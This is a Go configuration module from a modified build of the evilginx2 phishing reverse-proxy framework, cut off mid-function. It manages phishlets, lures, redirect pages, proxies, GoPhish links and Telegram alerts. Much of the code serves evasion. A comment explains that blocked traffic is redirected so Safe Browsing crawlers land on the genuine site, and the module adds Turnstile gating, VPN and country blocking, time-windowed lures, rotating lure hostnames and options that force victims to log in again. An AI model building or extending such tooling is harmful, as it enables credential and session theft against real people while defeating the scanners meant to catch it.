package core

import (
	"fmt"
	"math/rand"
	"net/url"
	"os"
	"path/filepath"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/kgretzky/evilginx2/log"

	"github.com/spf13/viper"
)

// =============================================================================
// ADD THESE 4 LINES RIGHT HERE — global GeoIP state (after imports, before BLACKLIST_MODES)
// =============================================================================
var globalGeoIP *GeoIPDatabase
var globalBlockVPN bool
var globalBlockedCountries []string
var globalConfigMu sync.RWMutex

var BLACKLIST_MODES = []string{"all", "unauth", "noadd", "off"}

type Lure struct {
	Id              string `mapstructure:"id" json:"id" yaml:"id"`
	Hostname        string `mapstructure:"hostname" json:"hostname" yaml:"hostname"`
	Path            string `mapstructure:"path" json:"path" yaml:"path"`
	RedirectUrl     string `mapstructure:"redirect_url" json:"redirect_url" yaml:"redirect_url"`
	Phishlet        string `mapstructure:"phishlet" json:"phishlet" yaml:"phishlet"`
	Redirector      string `mapstructure:"redirector" json:"redirector" yaml:"redirector"`
	UserAgentFilter string `mapstructure:"ua_filter" json:"ua_filter" yaml:"ua_filter"`
	Info            string `mapstructure:"info" json:"info" yaml:"info"`
	OgTitle         string `mapstructure:"og_title" json:"og_title" yaml:"og_title"`
	OgDescription   string `mapstructure:"og_desc" json:"og_desc" yaml:"og_desc"`
	OgImageUrl      string `mapstructure:"og_image" json:"og_image" yaml:"og_image"`
	OgUrl           string `mapstructure:"og_url" json:"og_url" yaml:"og_url"`
	PausedUntil     int64  `mapstructure:"paused" json:"paused" yaml:"paused"`
	PostRedirector  string `mapstructure:"post_redirector" json:"post_redirector" yaml:"post_redirector"`
	AutoRotate      bool   `mapstructure:"auto_rotate" json:"auto_rotate" yaml:"auto_rotate"`
	RotateInterval  int64  `mapstructure:"rotate_interval" json:"rotate_interval" yaml:"rotate_interval"`
	NextRotate      int64  `mapstructure:"next_rotate" json:"next_rotate" yaml:"next_rotate"`
	RotateNotify    bool   `mapstructure:"rotate_notify" json:"rotate_notify" yaml:"rotate_notify"`
	ActiveHours     string `mapstructure:"active_hours" json:"active_hours" yaml:"active_hours"`
	ActiveDays      string `mapstructure:"active_days" json:"active_days" yaml:"active_days"`
	ActiveTZ        string `mapstructure:"active_tz" json:"active_tz" yaml:"active_tz"`
	// LoginPrompt overrides general.login_prompt for this lure (off | login |
	// select_account). Empty means inherit. Returning-visitor lures want
	// select_account, cold lures may want login.
	LoginPrompt string `mapstructure:"login_prompt" json:"login_prompt" yaml:"login_prompt"`
}

type SubPhishlet struct {
	Name       string            `mapstructure:"name" json:"name" yaml:"name"`
	ParentName string            `mapstructure:"parent_name" json:"parent_name" yaml:"parent_name"`
	Params     map[string]string `mapstructure:"params" json:"params" yaml:"params"`
}

type PhishletConfig struct {
	Hostname  string `mapstructure:"hostname" json:"hostname" yaml:"hostname"`
	UnauthUrl string `mapstructure:"unauth_url" json:"unauth_url" yaml:"unauth_url"`
	Enabled   bool   `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
	Visible   bool   `mapstructure:"visible" json:"visible" yaml:"visible"`
}

type RedirectPage struct {
	Subdomain string `mapstructure:"subdomain" json:"subdomain" yaml:"subdomain"`
	File      string `mapstructure:"file" json:"file" yaml:"file"`
	TargetURL string `mapstructure:"target_url" json:"target_url" yaml:"target_url"`
	Turnstile bool   `mapstructure:"turnstile" json:"turnstile" yaml:"turnstile"`
	// Turnstile presentation (optional)
	TurnstilePos   string `mapstructure:"turnstile_pos" json:"turnstile_pos" yaml:"turnstile_pos"`       // slot|inline|overlay|center|bottom|corner
	TurnstileType  string `mapstructure:"turnstile_type" json:"turnstile_type" yaml:"turnstile_type"`    // managed|non-interactive|invisible
	TurnstileTheme string `mapstructure:"turnstile_theme" json:"turnstile_theme" yaml:"turnstile_theme"` // light|dark|auto
	Delay          int    `mapstructure:"delay" json:"delay" yaml:"delay"`                               // seconds before redirect
	Template       string `mapstructure:"template" json:"template" yaml:"template"`                      // source template slug
	// Per-page branding overrides (empty = use the template default)
	Brand    string   `mapstructure:"brand" json:"brand" yaml:"brand"`
	Title    string   `mapstructure:"title" json:"title" yaml:"title"`
	Subtitle string   `mapstructure:"subtitle" json:"subtitle" yaml:"subtitle"`
	Accent   string   `mapstructure:"accent" json:"accent" yaml:"accent"`
	Logo     string   `mapstructure:"logo" json:"logo" yaml:"logo"`
	Button   string   `mapstructure:"button" json:"button" yaml:"button"`
	Messages []string `mapstructure:"messages" json:"messages" yaml:"messages"`
}

type ProxyConfig struct {
	Type     string `mapstructure:"type" json:"type" yaml:"type"`
	Address  string `mapstructure:"address" json:"address" yaml:"address"`
	Port     int    `mapstructure:"port" json:"port" yaml:"port"`
	Username string `mapstructure:"username" json:"username" yaml:"username"`
	Password string `mapstructure:"password" json:"password" yaml:"password"`
	Enabled  bool   `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
}

type BlacklistConfig struct {
	Mode string `mapstructure:"mode" json:"mode" yaml:"mode"`
}

type CertificatesConfig struct {
}

type GoPhishConfig struct {
	AdminUrl    string `mapstructure:"admin_url" json:"admin_url" yaml:"admin_url"`
	ApiKey      string `mapstructure:"api_key" json:"api_key" yaml:"api_key"`
	InsecureTLS bool   `mapstructure:"insecure" json:"insecure" yaml:"insecure"`
}

type GeneralConfig struct {
	Domain          string `mapstructure:"domain" json:"domain" yaml:"domain"`
	OldIpv4         string `mapstructure:"ipv4" json:"ipv4" yaml:"ipv4"`
	ExternalIpv4    string `mapstructure:"external_ipv4" json:"external_ipv4" yaml:"external_ipv4"`
	BindIpv4        string `mapstructure:"bind_ipv4" json:"bind_ipv4" yaml:"bind_ipv4"`
	UnauthUrl       string `mapstructure:"unauth_url" json:"unauth_url" yaml:"unauth_url"`
	HttpsPort       int    `mapstructure:"https_port" json:"https_port" yaml:"https_port"`
	DnsPort         int    `mapstructure:"dns_port" json:"dns_port" yaml:"dns_port"`
	Autocert        bool   `mapstructure:"autocert" json:"autocert" yaml:"autocert"`
	TelegramEnabled bool   `mapstructure:"telegram_enabled" json:"telegram_enabled" yaml:"telegram_enabled"`
	HttpPort        int    `mapstructure:"http_port" json:"http_port" yaml:"http_port"`
	Chatid          string `mapstructure:"chatid" json:"chatid" yaml:"chatid"`
	Teletoken       string `mapstructure:"teletoken" json:"teletoken" yaml:"teletoken"`
	StripHeaders    bool   `mapstructure:"strip_headers" json:"strip_headers" yaml:"strip_headers"`
	ForceLogin      bool   `mapstructure:"force_login" json:"force_login" yaml:"force_login"`
	// LoginPrompt is the real setting: off | login | select_account. ForceLogin is
	// kept as a legacy alias (on = login) so configs written before it existed
	// keep working and stay readable by older tooling.
	LoginPrompt        string `mapstructure:"login_prompt" json:"login_prompt" yaml:"login_prompt"`
	UnauthRedirect     bool   `mapstructure:"unauth_redirect" json:"unauth_redirect" yaml:"unauth_redirect"`
	DashboardSubdomain string `mapstructure:"dashboard_sub" json:"dashboard_sub" yaml:"dashboard_sub"`
	DashboardUser      string `mapstructure:"dashboard_user" json:"dashboard_user" yaml:"dashboard_user"`
	DashboardPass      string `mapstructure:"dashboard_pass" json:"dashboard_pass" yaml:"dashboard_pass"`
	TurnstileSiteKey   string `mapstructure:"turnstile_site_key" json:"turnstile_site_key" yaml:"turnstile_site_key"`
	TurnstileSecretKey string `mapstructure:"turnstile_secret_key" json:"turnstile_secret_key" yaml:"turnstile_secret_key"`
}

type Config struct {
	general         *GeneralConfig
	certificates    *CertificatesConfig
	blacklistConfig *BlacklistConfig
	gophishConfig   *GoPhishConfig
	proxyConfig     *ProxyConfig
	phishletConfig  map[string]*PhishletConfig
	phishlets       map[string]*Phishlet
	phishletNames   []string
	activeHostnames []string
	redirectorsDir  string
	phishletsDir    string
	lures           []*Lure
	lureIds         []string
	subphishlets    []*SubPhishlet
	cfg             *viper.Viper
	redirectPages   []*RedirectPage
	redirectsDir    string
}

const (
	CFG_GENERAL      = "general"
	CFG_CERTIFICATES = "certificates"
	CFG_LURES        = "lures"
	CFG_PROXY        = "proxy"
	CFG_PHISHLETS    = "phishlets"
	CFG_BLACKLIST    = "blacklist"
	CFG_SUBPHISHLETS = "subphishlets"
	CFG_GOPHISH      = "gophish"
	CFG_REDIRECTS    = "redirects"
)

const DEFAULT_UNAUTH_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"

func NewConfig(cfg_dir string, path string) (*Config, error) {
	c := &Config{
		general:         &GeneralConfig{},
		certificates:    &CertificatesConfig{},
		gophishConfig:   &GoPhishConfig{},
		phishletConfig:  make(map[string]*PhishletConfig),
		phishlets:       make(map[string]*Phishlet),
		phishletNames:   []string{},
		lures:           []*Lure{},
		blacklistConfig: &BlacklistConfig{},
	}

	c.cfg = viper.New()
	c.cfg.SetConfigType("json")

	if path == "" {
		path = filepath.Join(cfg_dir, "config.json")
	}
	err := os.MkdirAll(filepath.Dir(path), os.FileMode(0700))
	if err != nil {
		return nil, err
	}
	var created_cfg bool = false
	c.cfg.SetConfigFile(path)
	if _, err := os.Stat(path); os.IsNotExist(err) {
		created_cfg = true
		err = c.cfg.WriteConfigAs(path)
		if err != nil {
			return nil, err
		}
	}

	err = c.cfg.ReadInConfig()
	if err != nil {
		return nil, err
	}

	c.cfg.UnmarshalKey(CFG_GENERAL, &c.general)
	if c.cfg.Get("general.autocert") == nil {
		c.cfg.Set("general.autocert", true)
		c.general.Autocert = true
	}
	if c.cfg.Get("general.strip_headers") == nil {
		c.cfg.Set("general.strip_headers", true)
		c.general.StripHeaders = true
	}
	if c.cfg.Get("general.force_login") == nil {
		c.cfg.Set("general.force_login", true)
		c.general.ForceLogin = true
	}
	// login_prompt is the stored setting; force_login is derived from it. An
	// adopted config that only carries force_login keeps its meaning.
	if c.cfg.Get("general.login_prompt") == nil {
		prompt := LOGIN_PROMPT_LOGIN
		if c.cfg.IsSet("general.force_login") && !c.cfg.GetBool("general.force_login") {
			prompt = LOGIN_PROMPT_OFF
		}
		c.general.LoginPrompt = prompt
		c.cfg.Set("general.login_prompt", prompt)
	}
	if NormalizeLoginPrompt(c.general.LoginPrompt) == "" {
		c.general.LoginPrompt = LOGIN_PROMPT_LOGIN
		c.cfg.Set("general.login_prompt", c.general.LoginPrompt)
	}
	c.general.ForceLogin = c.general.LoginPrompt != LOGIN_PROMPT_OFF
	c.cfg.Set("general.force_login", c.general.ForceLogin)

	c.cfg.UnmarshalKey(CFG_BLACKLIST, &c.blacklistConfig)

	c.cfg.UnmarshalKey(CFG_GOPHISH, &c.gophishConfig)

	if c.general.OldIpv4 != "" {
		if c.general.ExternalIpv4 == "" {
			c.SetServerExternalIP(c.general.OldIpv4)
		}
		c.SetServerIP("")
	}

	if !stringExists(c.blacklistConfig.Mode, BLACKLIST_MODES) {
		c.SetBlacklistMode("unauth")
	}

	if c.general.UnauthUrl == "" && created_cfg {
		c.SetUnauthUrl(DEFAULT_UNAUTH_URL)
	}
	// unauthorized/blocked traffic is turned away with an HTTP 302 to unauth_url by
	// default (instead of rendering a fetched copy). A redirect makes Safe Browsing
	// and other crawlers land on the genuine site, which is the cleanest signal.
	if !c.cfg.IsSet("general.unauth_redirect") {
		c.general.UnauthRedirect = true
		c.cfg.Set("general.unauth_redirect", true)
	}
	if c.general.HttpsPort == 0 {
		c.SetHttpsPort(443)
	}
	if c.general.DnsPort == 0 {
		c.SetDnsPort(53)
	}
	if created_cfg {
		c.EnableAutocert(true)
	}

	c.lures = []*Lure{}
	c.cfg.UnmarshalKey(CFG_LURES, &c.lures)
	c.redirectPages = []*RedirectPage{}
	c.cfg.UnmarshalKey(CFG_REDIRECTS, &c.redirectPages)
	c.proxyConfig = &ProxyConfig{}
	c.cfg.UnmarshalKey(CFG_PROXY, &c.proxyConfig)
	c.cfg.UnmarshalKey(CFG_PHISHLETS, &c.phishletConfig)
	c.cfg.UnmarshalKey(CFG_CERTIFICATES, &c.certificates)

	for i := 0; i < len(c.lures); i++ {
		c.lureIds = append(c.lureIds, GenRandomToken())
	}

	c.cfg.WriteConfig()
	return c, nil
}

func (c *Config) PhishletConfig(site string) *PhishletConfig {
	if o, ok := c.phishletConfig[site]; ok {
		return o
	} else {
		o := &PhishletConfig{
			Hostname:  "",
			UnauthUrl: "",
			Enabled:   false,
			Visible:   true,
		}
		c.phishletConfig[site] = o
		return o
	}
}

func (c *Config) SavePhishlets() {
	c.cfg.Set(CFG_PHISHLETS, c.phishletConfig)
	c.cfg.WriteConfig()
}

func (c *Config) SetSiteHostname(site string, hostname string) bool {
	if c.general.Domain == "" {
		log.Error("you need to set server top-level domain, first. type: server your-domain.com")
		return false
	}
	pl, err := c.GetPhishlet(site)
	if err != nil {
		log.Error("%v", err)
		return false
	}
	if pl.isTemplate {
		log.Error("phishlet is a template - can't set hostname")
		return false
	}
	if hostname != "" && hostname != c.general.Domain && !strings.HasSuffix(hostname, "."+c.general.Domain) {
		log.Error("phishlet hostname must end with '%s'", c.general.Domain)
		return false
	}
	log.Info("phishlet '%s' hostname set to: %s", site, hostname)
	c.PhishletConfig(site).Hostname = hostname
	c.SavePhishlets()
	return true
}

func (c *Config) SetSiteUnauthUrl(site string, _url string) bool {
	pl, err := c.GetPhishlet(site)
	if err != nil {
		log.Error("%v", err)
		return false
	}
	if pl.isTemplate {
		log.Error("phishlet is a template - can't set unauth_url")
		return false
	}
	if _url != "" {
		_, err := url.ParseRequestURI(_url)
		if err != nil {
			log.Error("invalid URL: %s", err)
			return false
		}
	}
	log.Info("phishlet '%s' unauth_url set to: %s", site, _url)
	c.PhishletConfig(site).UnauthUrl = _url
	c.SavePhishlets()
	return true
}

func (c *Config) SetBaseDomain(domain string) {
	c.general.Domain = domain
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("server domain set to: %s", domain)
	c.cfg.WriteConfig()
}

func (c *Config) SetServerIP(ip_addr string) {
	c.general.OldIpv4 = ip_addr
	c.cfg.Set(CFG_GENERAL, c.general)
	c.cfg.WriteConfig()
}

func (c *Config) SetServerExternalIP(ip_addr string) {
	c.general.ExternalIpv4 = ip_addr
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("server external IP set to: %s", ip_addr)
	c.cfg.WriteConfig()
}

func (c *Config) SetServerBindIP(ip_addr string) {
	c.general.BindIpv4 = ip_addr
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("server bind IP set to: %s", ip_addr)
	log.Warning("you may need to restart evilginx for the changes to take effect")
	c.cfg.WriteConfig()
}

func (c *Config) SetHttpsPort(port int) {
	c.general.HttpsPort = port
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("https port set to: %d", port)
	c.cfg.WriteConfig()
}

func (c *Config) SetDnsPort(port int) {
	c.general.DnsPort = port
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("dns port set to: %d", port)
	c.cfg.WriteConfig()
}

func (c *Config) EnableProxy(enabled bool) {
	c.proxyConfig.Enabled = enabled
	c.cfg.Set(CFG_PROXY, c.proxyConfig)
	if enabled {
		log.Info("enabled proxy")
	} else {
		log.Info("disabled proxy")
	}
	c.cfg.WriteConfig()
}

func (c *Config) SetProxyType(ptype string) {
	ptypes := []string{"http", "https", "socks5", "socks5h"}
	if !stringExists(ptype, ptypes) {
		log.Error("invalid proxy type selected")
		return
	}
	c.proxyConfig.Type = ptype
	c.cfg.Set(CFG_PROXY, c.proxyConfig)
	log.Info("proxy type set to: %s", ptype)
	c.cfg.WriteConfig()
}

func (c *Config) SetProxyAddress(address string) {
	c.proxyConfig.Address = address
	c.cfg.Set(CFG_PROXY, c.proxyConfig)
	log.Info("proxy address set to: %s", address)
	c.cfg.WriteConfig()
}

func (c *Config) SetProxyPort(port int) {
	c.proxyConfig.Port = port
	c.cfg.Set(CFG_PROXY, c.proxyConfig.Port)
	log.Info("proxy port set to: %d", port)
	c.cfg.WriteConfig()
}

func (c *Config) SetProxyUsername(username string) {
	c.proxyConfig.Username = username
	c.cfg.Set(CFG_PROXY, c.proxyConfig)
	log.Info("proxy username set to: %s", username)
	c.cfg.WriteConfig()
}

func (c *Config) SetProxyPassword(password string) {
	c.proxyConfig.Password = password
	c.cfg.Set(CFG_PROXY, c.proxyConfig)
	log.Info("proxy password set to: %s", password)
	c.cfg.WriteConfig()
}

func (c *Config) SetGoPhishAdminUrl(k string) {
	u, err := url.ParseRequestURI(k)
	if err != nil {
		log.Error("invalid url: %s", err)
		return
	}

	c.gophishConfig.AdminUrl = u.String()
	c.cfg.Set(CFG_GOPHISH, c.gophishConfig)
	log.Info("gophish admin url set to: %s", u.String())
	c.cfg.WriteConfig()
}

func (c *Config) SetGoPhishApiKey(k string) {
	c.gophishConfig.ApiKey = k
	c.cfg.Set(CFG_GOPHISH, c.gophishConfig)
	log.Info("gophish api key set to: %s", k)
	c.cfg.WriteConfig()
}

func (c *Config) SetGoPhishInsecureTLS(k bool) {
	c.gophishConfig.InsecureTLS = k
	c.cfg.Set(CFG_GOPHISH, c.gophishConfig)
	log.Info("gophish insecure set to: %v", k)
	c.cfg.WriteConfig()
}

func (c *Config) IsLureHostnameValid(hostname string) bool {
	for _, l := range c.lures {
		if l.Hostname == hostname {
			if c.PhishletConfig(l.Phishlet).Enabled {
				return true
			}
		}
	}
	return false
}

func (c *Config) SetSiteEnabled(site string) error {
	pl, err := c.GetPhishlet(site)
	if err != nil {
		log.Error("%v", err)
		return err
	}
	if c.PhishletConfig(site).Hostname == "" {
		return fmt.Errorf("enabling phishlet '%s' requires its hostname to be set up", site)
	}
	if pl.isTemplate {
		return fmt.Errorf("phishlet '%s' is a template - you have to 'create' child phishlet from it, with predefined parameters, before you can enable it.", site)
	}
	c.PhishletConfig(site).Enabled = true
	c.refreshActiveHostnames()
	c.VerifyPhishlets()
	log.Info("enabled phishlet '%s'", site)

	c.SavePhishlets()
	return nil
}

func (c *Config) SetSiteDisabled(site string) error {
	if _, err := c.GetPhishlet(site); err != nil {
		log.Error("%v", err)
		return err
	}
	c.PhishletConfig(site).Enabled = false
	c.refreshActiveHostnames()
	log.Info("disabled phishlet '%s'", site)

	c.SavePhishlets()
	return nil
}

func (c *Config) SetSiteHidden(site string, hide bool) error {
	if _, err := c.GetPhishlet(site); err != nil {
		log.Error("%v", err)
		return err
	}
	c.PhishletConfig(site).Visible = !hide
	c.refreshActiveHostnames()

	if hide {
		log.Info("phishlet '%s' is now hidden and all requests to it will be redirected", site)
	} else {
		log.Info("phishlet '%s' is now reachable and visible from the outside", site)
	}
	c.SavePhishlets()
	return nil
}

func (c *Config) SetRedirectorsDir(path string) {
	c.redirectorsDir = path
}

func (c *Config) ResetAllSites() {
	c.phishletConfig = make(map[string]*PhishletConfig)
	c.SavePhishlets()
}

func (c *Config) IsSiteEnabled(site string) bool {
	return c.PhishletConfig(site).Enabled
}

func (c *Config) IsSiteHidden(site string) bool {
	return !c.PhishletConfig(site).Visible
}

func (c *Config) GetEnabledSites() []string {
	var sites []string
	for k, o := range c.phishletConfig {
		if o.Enabled {
			sites = append(sites, k)
		}
	}
	return sites
}

func (c *Config) SetBlacklistMode(mode string) {
	if stringExists(mode, BLACKLIST_MODES) {
		c.blacklistConfig.Mode = mode
		c.cfg.Set(CFG_BLACKLIST, c.blacklistConfig)
		c.cfg.WriteConfig()
	}
	log.Info("blacklist mode set to: %s", mode)
}

func (c *Config) SetUnauthUrl(_url string) {
	c.general.UnauthUrl = _url
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("unauthorized request redirection URL set to: %s", _url)
	c.cfg.WriteConfig()
}

func (c *Config) EnableAutocert(enabled bool) {
	c.general.Autocert = enabled
	if enabled {
		log.Info("autocert is now enabled")
	} else {
		log.Info("autocert is now disabled")
	}
	c.cfg.Set(CFG_GENERAL, c.general)
	c.cfg.WriteConfig()
}

func (c *Config) refreshActiveHostnames() {
	c.activeHostnames = []string{}
	sites := c.GetEnabledSites()
	for _, site := range sites {
		pl, err := c.GetPhishlet(site)
		if err != nil {
			continue
		}
		for _, host := range pl.GetPhishHosts(false) {
			c.activeHostnames = append(c.activeHostnames, strings.ToLower(host))
		}
	}
	for _, l := range c.lures {
		if stringExists(l.Phishlet, sites) {
			if l.Hostname != "" {
				c.activeHostnames = append(c.activeHostnames, strings.ToLower(l.Hostname))
			}
		}
	}
}

func (c *Config) GetActiveHostnames(site string) []string {
	var ret []string
	sites := c.GetEnabledSites()
	for _, _site := range sites {
		if site == "" || _site == site {
			pl, err := c.GetPhishlet(_site)
			if err != nil {
				continue
			}
			for _, host := range pl.GetPhishHosts(false) {
				ret = append(ret, strings.ToLower(host))
			}
		}
	}
	for _, l := range c.lures {
		if site == "" || l.Phishlet == site {
			if l.Hostname != "" {
				hostname := strings.ToLower(l.Hostname)
				ret = append(ret, hostname)
			}
		}
	}
	return ret
}

func (c *Config) IsActiveHostname(host string) bool {
	host = strings.ToLower(host)
	if host[len(host)-1:] == "." {
		host = host[:len(host)-1]
	}
	for _, h := range c.activeHostnames {
		if h == host {
			return true
		}
	}
	return false
}

func (c *Config) AddPhishlet(site string, pl *Phishlet) {
	c.phishletNames = append(c.phishletNames, site)
	c.phishlets[site] = pl
	c.VerifyPhishlets()
}

func (c *Config) AddSubPhishlet(site string, parent_site string, customParams map[string]string) error {
	pl, err := c.GetPhishlet(parent_site)
	if err != nil {
		return err
	}
	_, err = c.GetPhishlet(site)
	if err == nil {
		return fmt.Errorf("phishlet '%s' already exists", site)
	}
	sub_pl, err := NewPhishlet(site, pl.Path, &customParams, c)
	if err != nil {
		return err
	}
	sub_pl.ParentName = parent_site

	c.phishletNames = append(c.phishletNames, site)
	c.phishlets[site] = sub_pl
	c.VerifyPhishlets()

	return nil
}

func (c *Config) DeleteSubPhishlet(site string) error {
	pl, err := c.GetPhishlet(site)
	if err != nil {
		return err
	}
	if pl.ParentName == "" {
		return fmt.Errorf("phishlet '%s' can't be deleted - you can only delete child phishlets.", site)
	}

	c.phishletNames = removeString(site, c.phishletNames)
	delete(c.phishlets, site)
	delete(c.phishletConfig, site)
	c.SavePhishlets()
	return nil
}

func (c *Config) LoadSubPhishlets() {
	var subphishlets []*SubPhishlet
	c.cfg.UnmarshalKey(CFG_SUBPHISHLETS, &subphishlets)
	for _, spl := range subphishlets {
		err := c.AddSubPhishlet(spl.Name, spl.ParentName, spl.Params)
		if err != nil {
			log.Error("phishlets: %s", err)
		}
	}
}

func (c *Config) SaveSubPhishlets() {
	var subphishlets []*SubPhishlet
	for _, pl := range c.phishlets {
		if pl.ParentName != "" {
			spl := &SubPhishlet{
				Name:       pl.Name,
				ParentName: pl.ParentName,
				Params:     pl.customParams,
			}
			subphishlets = append(subphishlets, spl)
		}
	}

	c.cfg.Set(CFG_SUBPHISHLETS, subphishlets)
	c.cfg.WriteConfig()
}

func (c *Config) VerifyPhishlets() {
	hosts := make(map[string]string)

	for site, pl := range c.phishlets {
		if pl.isTemplate {
			continue
		}
		for _, ph := range pl.proxyHosts {
			phish_host := combineHost(ph.phish_subdomain, ph.domain)
			orig_host := combineHost(ph.orig_subdomain, ph.domain)
			if c_site, ok := hosts[phish_host]; ok {
				log.Warning("phishlets: hostname '%s' collision between '%s' and '%s' phishlets", phish_host, site, c_site)
			} else if c_site, ok := hosts[orig_host]; ok {
				log.Warning("phishlets: hostname '%s' collision between '%s' and '%s' phishlets", orig_host, site, c_site)
			}
			hosts[phish_host] = site
			hosts[orig_host] = site
		}
	}
}

func (c *Config) CleanUp() {

	for k := range c.phishletConfig {
		_, err := c.GetPhishlet(k)
		if err != nil {
			delete(c.phishletConfig, k)
		}
	}
	c.SavePhishlets()
}

func (c *Config) AddLure(site string, l *Lure) {
	c.lures = append(c.lures, l)
	c.lureIds = append(c.lureIds, GenRandomToken())
	c.cfg.Set(CFG_LURES, c.lures)
	c.cfg.WriteConfig()
	c.refreshActiveHostnames()
}

func (c *Config) SetLure(index int, l *Lure) error {
	if index >= 0 && index < len(c.lures) {
		c.lures[index] = l
	} else {
		return fmt.Errorf("index out of bounds: %d", index)
	}
	c.cfg.Set(CFG_LURES, c.lures)
	c.cfg.WriteConfig()
	c.refreshActiveHostnames()
	return nil
}

func (c *Config) DeleteLure(index int) error {
	if index >= 0 && index < len(c.lures) {
		c.lures = append(c.lures[:index], c.lures[index+1:]...)
		c.lureIds = append(c.lureIds[:index], c.lureIds[index+1:]...)
	} else {
		return fmt.Errorf("index out of bounds: %d", index)
	}
	c.cfg.Set(CFG_LURES, c.lures)
	c.cfg.WriteConfig()
	c.refreshActiveHostnames()
	return nil
}

func (c *Config) DeleteLures(index []int) []int {
	tlures := []*Lure{}
	tlureIds := []string{}
	di := []int{}
	for n, l := range c.lures {
		if !intExists(n, index) {
			tlures = append(tlures, l)
			tlureIds = append(tlureIds, c.lureIds[n])
		} else {
			di = append(di, n)
		}
	}
	if len(di) > 0 {
		c.lures = tlures
		c.lureIds = tlureIds
		c.cfg.Set(CFG_LURES, c.lures)
		c.cfg.WriteConfig()
	}
	return di
}

func (c *Config) GetLure(index int) (*Lure, error) {
	if index >= 0 && index < len(c.lures) {
		return c.lures[index], nil
	} else {
		return nil, fmt.Errorf("index out of bounds: %d", index)
	}
}

// GetAutoLureByHostname returns the first auto-rotating lure whose Hostname matches,
// along with its index in the lures slice. Returns nil, -1 if none found.
func (c *Config) GetAutoLureByHostname(hostname string) (*Lure, int) {
	for i, l := range c.lures {
		if l.AutoRotate && strings.EqualFold(l.Hostname, hostname) {
			return l, i
		}
	}
	return nil, -1
}

// isLureActiveNow returns false when the lure has time-gating configured and
// the current time falls outside the allowed window, true otherwise.
func isLureActiveNow(l *Lure) bool {
	if l.ActiveHours == "" && l.ActiveDays == "" {
		return true
	}

	loc := time.UTC
	if l.ActiveTZ != "" {
		if tz, err := time.LoadLocation(l.ActiveTZ); err == nil {
			loc = tz
		}
	}
	now := time.Now().In(loc)

	if l.ActiveDays != "" {
		dayMap := map[string]time.Weekday{
			"Mon": time.Monday, "Tue": time.Tuesday, "Wed": time.Wednesday,
			"Thu": time.Thursday, "Fri": time.Friday, "Sat": time.Saturday,
			"Sun": time.Sunday,
		}
		dayOk := false
		for _, d := range strings.Split(l.ActiveDays, ",") {
			if wd, ok := dayMap[strings.TrimSpace(d)]; ok && now.Weekday() == wd {
				dayOk = true
				break
			}
		}
		if !dayOk {
			return false
		}
	}

	if l.ActiveHours != "" {
		parts := strings.SplitN(l.ActiveHours, "-", 2)
		if len(parts) == 2 {
			sp := strings.SplitN(parts[0], ":", 2)
			ep := strings.SplitN(parts[1], ":", 2)
			if len(sp) == 2 && len(ep) == 2 {
				sh, _ := strconv.Atoi(sp[0])
				sm, _ := strconv.Atoi(sp[1])
				eh, _ := strconv.Atoi(ep[0])
				em, _ := strconv.Atoi(ep[1])
				nowM := now.Hour()*60 + now.Minute()
				startM := sh*60 + sm
				endM := eh*60 + em
				if nowM < startM || nowM >= endM {
					return false
				}
			}
		}
	}
	return true
}

func (c *Config) GetLureByPath(site string, host string, path string) (*Lure, error) {
	for _, l := range c.lures {
		if l.Phishlet == site {
			pl, err := c.GetPhishlet(site)
			if err == nil {
				if host == l.Hostname || host == pl.GetLandingPhishHost() {
					if l.Path == path {
						if !isLureActiveNow(l) {
							return nil, fmt.Errorf("lure for path '%s' is outside active hours", path)
						}
						return l, nil
					}
				}
			}
		}
	}
	return nil, fmt.Errorf("lure for path '%s' not found", path)
}

// FindLureByPath searches all lures across all phishlets, matching by host and
// path without restricting to a specific phishlet name. Returns the matching
// lure and its owning phishlet so the caller can override hostname-based
// phishlet resolution with the authoritative lure owner.
func (c *Config) FindLureByPath(host string, path string) (*Lure, *Phishlet, error) {
	for _, l := range c.lures {
		pl, err := c.GetPhishlet(l.Phishlet)
		if err != nil {
			continue
		}
		if l.Hostname != "" {
			if host != l.Hostname {
				continue
			}
		} else {
			if host != pl.GetLandingPhishHost() {
				continue
			}
		}
		if l.Path == path {
			if !isLureActiveNow(l) {
				return nil, nil, fmt.Errorf("lure for path '%s' is outside active hours", path)
			}
			return l, pl, nil
		}
	}
	return nil, nil, fmt.Errorf("no lure for path '%s' on host '%s'", path, host)
}

func (c *Config) GetPhishlet(site string) (*Phishlet, error) {
	pl, ok := c.phishlets[site]
	if !ok {
		return nil, fmt.Errorf("phishlet '%s' not found", site)
	}
	return pl, nil
}

// ReloadPhishlet replaces an existing phishlet in memory (for hot-reload without restart).
// Returns an error if the phishlet name is not already registered.
func (c *Config) ReloadPhishlet(site string, pl *Phishlet) error {
	if _, ok := c.phishlets[site]; !ok {
		return fmt.Errorf("phishlet '%s' not found", site)
	}
	c.phishlets[site] = pl
	c.VerifyPhishlets()
	return nil
}

func (c *Config) GetPhishletNames() []string {
	return c.phishletNames
}

func (c *Config) GetSiteDomain(site string) (string, bool) {
	if o, ok := c.phishletConfig[site]; ok {
		return o.Hostname, ok
	}
	return "", false
}

func (c *Config) GetSiteUnauthUrl(site string) (string, bool) {
	if o, ok := c.phishletConfig[site]; ok {
		return o.UnauthUrl, ok
	}
	return "", false
}

func (c *Config) GetBaseDomain() string {
	return c.general.Domain
}

func (c *Config) GetServerExternalIP() string {
	return c.general.ExternalIpv4
}

func (c *Config) GetServerBindIP() string {
	return c.general.BindIpv4
}

func (c *Config) GetHttpsPort() int {
	return c.general.HttpsPort
}

func (c *Config) GetDnsPort() int {
	return c.general.DnsPort
}

func (c *Config) GetRedirectorsDir() string {
	return c.redirectorsDir
}

func (c *Config) GetBlacklistMode() string {
	return c.blacklistConfig.Mode
}

func (c *Config) IsAutocertEnabled() bool {
	return c.general.Autocert
}

func (c *Config) GetGoPhishAdminUrl() string {
	return c.gophishConfig.AdminUrl
}

func (c *Config) GetGoPhishApiKey() string {
	return c.gophishConfig.ApiKey
}

func (c *Config) GetGoPhishInsecureTLS() bool {
	return c.gophishConfig.InsecureTLS
}

func (c *Config) ValidateTelegramConfig() error {
	if c.general.Chatid == "" {
